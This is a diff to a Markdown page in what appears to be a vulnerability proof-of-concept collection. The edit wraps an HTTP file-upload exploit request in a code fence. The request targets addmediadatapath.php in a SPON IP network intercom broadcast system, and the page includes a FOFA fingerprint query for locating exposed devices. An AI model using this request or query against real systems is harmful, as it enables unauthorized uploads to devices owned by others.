@@ -80,6 +80,7 @@ FOFA：icon_hash="-1830859634"
 
 POC/EXP：
 
+```http
 POST /php/addmediadatapath.php HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 
@@ -100,6 +101,8 @@ Content-Type: audio/mp3
 
 123456
 ------WebKitFormBoundaryYrqVrkjRl2AHEKXG--
+```
+
 
 ![image-20241105223035534](./.resource/世邦通信IP网络对讲广播系统addmediadatapath.php文件上传/media/image-20241105223035534.png)
 
